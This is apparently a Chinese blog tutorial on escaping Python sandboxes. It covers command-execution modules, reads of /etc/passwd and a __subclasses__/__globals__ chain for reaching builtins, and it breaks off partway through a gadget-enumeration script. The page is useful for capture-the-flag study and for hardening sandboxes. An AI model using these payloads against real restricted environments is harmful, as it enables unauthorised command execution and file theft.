<h4 id="builtin-和-builtins"><a href="#builtin-和-builtins" class="headerlink" title="__builtin__ 和 __builtins__"></a>__builtin__ 和 __builtins__</h4><h5 id="python中可以直接运行一些函数，例如int-list-等等。这些函数可以在-builtins-中可以查到。查看的方法是dir-builtins-。在控制台中直接输入-builtins-会看到如下情况-。"><a href="#python中可以直接运行一些函数，例如int-list-等等。这些函数可以在-builtins-中可以查到。查看的方法是dir-builtins-。在控制台中直接输入-builtins-会看到如下情况-。" class="headerlink" title="python中可以直接运行一些函数，例如int(),list()等等。这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)。在控制台中直接输入__builtins__会看到如下情况.。"></a>python中可以直接运行一些函数，例如int(),list()等等。这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)。在控制台中直接输入__builtins__会看到如下情况.。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>

<h5 id="ps：在py3中-builtin-被换成了builtin"><a href="#ps：在py3中-builtin-被换成了builtin" class="headerlink" title="ps：在py3中__builtin__被换成了builtin"></a>ps：在py3中__builtin__被换成了builtin</h5><h5 id="builtin-和-builtins-之间是什么关系呢？"><a href="#builtin-和-builtins-之间是什么关系呢？" class="headerlink" title="__builtin__ 和 __builtins__之间是什么关系呢？"></a>__builtin__ 和 __builtins__之间是什么关系呢？</h5><h5 id="1、在主模块main中，-builtins-是对内建模块-builtin-本身的引用，即-builtins-完全等价于-builtin-，二者完全是一个东西，不分彼此。"><a href="#1、在主模块main中，-builtins-是对内建模块-builtin-本身的引用，即-builtins-完全等价于-builtin-，二者完全是一个东西，不分彼此。" class="headerlink" title="1、在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。"></a>1、在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。</h5><h5 id="2、非主模块main中，-builtins-仅是对-builtin-dict-的引用，而非-builtin-本身"><a href="#2、非主模块main中，-builtins-仅是对-builtin-dict-的引用，而非-builtin-本身" class="headerlink" title="2、非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身"></a>2、非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</h5><h4 id="模板的导入"><a href="#模板的导入" class="headerlink" title="模板的导入"></a>模板的导入</h4><h5 id="常规的导入方式："><a href="#常规的导入方式：" class="headerlink" title="常规的导入方式："></a>常规的导入方式：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line">__import__(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure>

<h5 id="除此之外，也可以通过路径引入模块，如在Linux系统中Python的os模块的路径一般都是在-usr-lib-python2-7-os-py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数："><a href="#除此之外，也可以通过路径引入模块，如在Linux系统中Python的os模块的路径一般都是在-usr-lib-python2-7-os-py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数：" class="headerlink" title="除此之外，也可以通过路径引入模块，如在Linux系统中Python的os模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数："></a>除此之外，也可以通过路径引入模块，如在Linux系统中Python的os模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos;</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="import导入机制：当-import-一个模块时首先会在-sys-modules-这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用-import-的模块的-Local-命名空间中。如果没有加载则从-sys-path-目录中按照模块名称查找模块文件，模块可以是-py、pyc、pyd，找到后将模块载入内存，并加到-sys-modules-中，并将名称导入到当前的-Local-命名空间。"><a href="#import导入机制：当-import-一个模块时首先会在-sys-modules-这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用-import-的模块的-Local-命名空间中。如果没有加载则从-sys-path-目录中按照模块名称查找模块文件，模块可以是-py、pyc、pyd，找到后将模块载入内存，并加到-sys-modules-中，并将名称导入到当前的-Local-命名空间。" class="headerlink" title="import导入机制：当 import 一个模块时首先会在 sys.modules 这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用 import 的模块的 Local 命名空间中。如果没有加载则从 sys.path 目录中按照模块名称查找模块文件，模块可以是 py、pyc、pyd，找到后将模块载入内存，并加到 sys.modules 中，并将名称导入到当前的 Local 命名空间。"></a>import导入机制：当 import 一个模块时首先会在 sys.modules 这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用 import 的模块的 Local 命名空间中。如果没有加载则从 sys.path 目录中按照模块名称查找模块文件，模块可以是 py、pyc、pyd，找到后将模块载入内存，并加到 sys.modules 中，并将名称导入到当前的 Local 命名空间。</h5><ul>
<li>通过 from a import b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。通过 import a as b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。对于嵌套导入的，比如 a.py 中存在一个 import b，那么 import a 时，a 和 b 模块都会被添加到 sys.modules 字典中，a 会被导入到当前的 Local 命名空间中，虽然模块 b 已经加载到内存了，如果访问还要再明确的在本模块中 import b。</li>
<li>导入模块时会执行该模块。</li>
<li>所以说如果某一个模块导入了os模块，我们就可以利用该模块的 dict 进而使用os模块，如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line">linecache.__dict__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">linecache.os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="0x02-可利用的模块和方法"><a href="#0x02-可利用的模块和方法" class="headerlink" title="0x02 可利用的模块和方法"></a>0x02 可利用的模块和方法</h4><h5 id="在-Python-的内建函数中，有一些函数可以帮助我们实现命令执行或文件操作的利用。"><a href="#在-Python-的内建函数中，有一些函数可以帮助我们实现命令执行或文件操作的利用。" class="headerlink" title="在 Python 的内建函数中，有一些函数可以帮助我们实现命令执行或文件操作的利用。"></a>在 Python 的内建函数中，有一些函数可以帮助我们实现命令执行或文件操作的利用。</h5><h4 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h4><h5 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 执行shell命令不会返回shell的输出</span></span><br><span class="line">os.system(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="comment"># 会产生返回值，可通过read()的方式读取返回值</span></span><br><span class="line">os.popen(<span class="string">"whoami"</span>).read()</span><br></pre></td></tr></table></figure>

<h5 id="commands模块"><a href="#commands模块" class="headerlink" title="commands模块"></a>commands模块</h5><h5 id="commands模块会返回命令的输出和执行的状态位，仅限Linux环境"><a href="#commands模块会返回命令的输出和执行的状态位，仅限Linux环境" class="headerlink" title="commands模块会返回命令的输出和执行的状态位，仅限Linux环境"></a>commands模块会返回命令的输出和执行的状态位，仅限Linux环境</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line">commands.getstatusoutput(<span class="string">"ls"</span>)</span><br><span class="line">commands.getoutput(<span class="string">"ls"</span>)</span><br><span class="line">commands.getstatus(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># for example cals of command</span></span><br><span class="line">subprocess.call(command, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(command, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h4 id="pty模块"><a href="#pty模块" class="headerlink" title="pty模块"></a>pty模块</h4><h5 id="仅限Linux环境"><a href="#仅限Linux环境" class="headerlink" title="仅限Linux环境"></a>仅限Linux环境</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="timeit模块"><a href="#timeit模块" class="headerlink" title="timeit模块"></a>timeit模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="platform模块"><a href="#platform模块" class="headerlink" title="platform模块"></a>platform模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform</span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure>

<h4 id="import-函数"><a href="#import-函数" class="headerlink" title="__import__()函数"></a>__import__()函数</h4><h5 id="这个函数只是通过引入其他命令执行库实现命令执行："><a href="#这个函数只是通过引入其他命令执行库实现命令执行：" class="headerlink" title="这个函数只是通过引入其他命令执行库实现命令执行："></a>这个函数只是通过引入其他命令执行库实现命令执行：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="importlib模块"><a href="#importlib模块" class="headerlink" title="importlib模块"></a>importlib模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># Python3可以，Python2没有该函数</span></span><br><span class="line">importlib.__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="exec-eval-execfile-compile-函数"><a href="#exec-eval-execfile-compile-函数" class="headerlink" title="exec()/eval()/execfile()/compile()函数"></a>exec()/eval()/execfile()/compile()函数</h4><h5 id="这几个函数都能执行参数的Python代码。"><a href="#这几个函数都能执行参数的Python代码。" class="headerlink" title="这几个函数都能执行参数的Python代码。"></a>这几个函数都能执行参数的Python代码。</h5><h5 id="注意：execfile-只存在于Python2，Python3没有该函数。"><a href="#注意：execfile-只存在于Python2，Python3没有该函数。" class="headerlink" title="注意：execfile()只存在于Python2，Python3没有该函数。"></a>注意：execfile()只存在于Python2，Python3没有该函数。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"__import__('os').system('calc')"</span>)</span><br><span class="line"></span><br><span class="line">eval(<span class="string">'__import__("os").system("calc")'</span>)</span><br><span class="line"></span><br><span class="line">execfile(<span class="string">'exp.py'</span>)</span><br><span class="line"><span class="comment"># 过滤import的情况可如下Bypass</span></span><br><span class="line">execfile(<span class="string">"E:\Python27\Lib\os.py"</span>)</span><br><span class="line">system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">exec(compile(<span class="string">'__import__("os").system("calc")'</span>, <span class="string">'&lt;string&gt;'</span>, <span class="string">'exec'</span>))</span><br></pre></td></tr></table></figure>

<h4 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h4><h5 id="该模块通过modules-函数引入命令执行模块来实现："><a href="#该模块通过modules-函数引入命令执行模块来实现：" class="headerlink" title="该模块通过modules()函数引入命令执行模块来实现："></a>该模块通过modules()函数引入命令执行模块来实现：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="文件操作类"><a href="#文件操作类" class="headerlink" title="文件操作类"></a>文件操作类</h4><h5 id="file-函数"><a href="#file-函数" class="headerlink" title="file()函数"></a>file()函数</h5><h5 id="注意：该函数只存在py2中"><a href="#注意：该函数只存在py2中" class="headerlink" title="注意：该函数只存在py2中"></a>注意：该函数只存在py2中</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">file(<span class="string">'flag.txt'</span>,<span class="string">'w'</span>).write(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure>

<h5 id="open-函数"><a href="#open-函数" class="headerlink" title="open()函数"></a>open()函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">open(<span class="string">'flag.txt'</span>,<span class="string">'a'</span>).write(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure>

<h5 id="codecs模块"><a href="#codecs模块" class="headerlink" title="codecs模块"></a>codecs模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">codecs.open(&apos;/etc/passwd&apos;).read()</span><br><span class="line">codecs.open(&apos;flag.txt&apos;, &apos;w&apos;).write(&apos;xxx&apos;)</span><br></pre></td></tr></table></figure>

<h4 id="获取当前python的环境信息"><a href="#获取当前python的环境信息" class="headerlink" title="获取当前python的环境信息"></a>获取当前python的环境信息</h4><h5 id="sys模块-1"><a href="#sys模块-1" class="headerlink" title="sys模块"></a>sys模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.version</span><br><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure>

<h4 id="0x03-沙箱逃逸技巧"><a href="#0x03-沙箱逃逸技巧" class="headerlink" title="0x03 沙箱逃逸技巧"></a>0x03 沙箱逃逸技巧</h4><h4 id="元素链"><a href="#元素链" class="headerlink" title="元素链"></a>元素链</h4><h5 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h5><h5 id="由前面知道，我们可以通过如下方式获取object类："><a href="#由前面知道，我们可以通过如下方式获取object类：" class="headerlink" title="由前面知道，我们可以通过如下方式获取object类："></a>由前面知道，我们可以通过如下方式获取object类：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">[].__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[1]</span><br><span class="line">().__class__.__mro__[1]</span><br><span class="line">[].__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-1]</span><br><span class="line">().__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure>

<h5 id="然后通过object类的-subclasses-方法获取所有的子类列表（Python2和Python3获取的子类不同）："><a href="#然后通过object类的-subclasses-方法获取所有的子类列表（Python2和Python3获取的子类不同）：" class="headerlink" title="然后通过object类的__subclasses__()方法获取所有的子类列表（Python2和Python3获取的子类不同）："></a>然后通过object类的__subclasses__()方法获取所有的子类列表（Python2和Python3获取的子类不同）：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[].__class__.__mro__[1].__subclasses__()</span><br><span class="line">&#123;&#125;.__class__.__mro__[1].__subclasses__()</span><br><span class="line">().__class__.__mro__[1].__subclasses__()</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure>

<h5 id="找到重载过的-init-类，例如："><a href="#找到重载过的-init-类，例如：" class="headerlink" title="找到重载过的__init__类，例如："></a>找到重载过的__init__类，例如：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__</span><br></pre></td></tr></table></figure>

<h5 id="在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有-globals-属性。"><a href="#在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有-globals-属性。" class="headerlink" title="在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有__globals__属性。"></a>在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有__globals__属性。</h5><h5 id="写个脚本帮我们来筛选出重载过的-init-类的类："><a href="#写个脚本帮我们来筛选出重载过的-init-类的类：" class="headerlink" title="写个脚本帮我们来筛选出重载过的__init__类的类："></a>写个脚本帮我们来筛选出重载过的__init__类的类：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = len(<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'wrapper'</span> <span class="keyword">not</span> <span class="keyword">in</span> str(<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[i].__init__):</span><br><span class="line">        <span class="keyword">print</span> (i, <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[i])</span><br></pre></td></tr></table></figure>

<h5 id="重载过的-init-类的类具有-globals-属性，这里以WarningMessage为例，会返回很多dict类型："><a href="#重载过的-init-类的类具有-globals-属性，这里以WarningMessage为例，会返回很多dict类型：" class="headerlink" title="重载过的__init__类的类具有__globals__属性，这里以WarningMessage为例，会返回很多dict类型："></a>重载过的__init__类的类具有__globals__属性，这里以WarningMessage为例，会返回很多dict类型：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__</span><br></pre></td></tr></table></figure>

<h5 id="寻找keys中的-builtins-来查看引用，这里同样会返回很多dict类型："><a href="#寻找keys中的-builtins-来查看引用，这里同样会返回很多dict类型：" class="headerlink" title="寻找keys中的__builtins__来查看引用，这里同样会返回很多dict类型："></a>寻找keys中的__builtins__来查看引用，这里同样会返回很多dict类型：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;]</span><br></pre></td></tr></table></figure>

<h5 id="再在keys中寻找可利用的函数即可，如file-函数为例："><a href="#再在keys中寻找可利用的函数即可，如file-函数为例：" class="headerlink" title="再在keys中寻找可利用的函数即可，如file()函数为例："></a>再在keys中寻找可利用的函数即可，如file()函数为例：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;).read()</span><br></pre></td></tr></table></figure>

<h5 id="至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。"><a href="#至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。" class="headerlink" title="至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。"></a>至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。</h5><h4 id="使用脚本遍历其他逃逸方法："><a href="#使用脚本遍历其他逃逸方法：" class="headerlink" title="使用脚本遍历其他逃逸方法："></a>使用脚本遍历其他逃逸方法：</h4><h4 id="py2脚本如下："><a href="#py2脚本如下：" class="headerlink" title="py2脚本如下："></a>py2脚本如下：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"></span><br><span class="line">find_modules = &#123;<span class="string">'filecmp'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'heapq'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'code'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'hotshot'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'distutils'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'functools'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'random'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tty'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'subprocess'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sysconfig'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'whichdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'runpy'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pty'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-atheos'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'xml'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sgmllib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'importlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserList'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tempfile'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimify'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pprint'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'platform'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'collections'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cProfile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'smtplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'compiler'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'string'</span>: [<span class="string">'__builtins__'</span>], <span 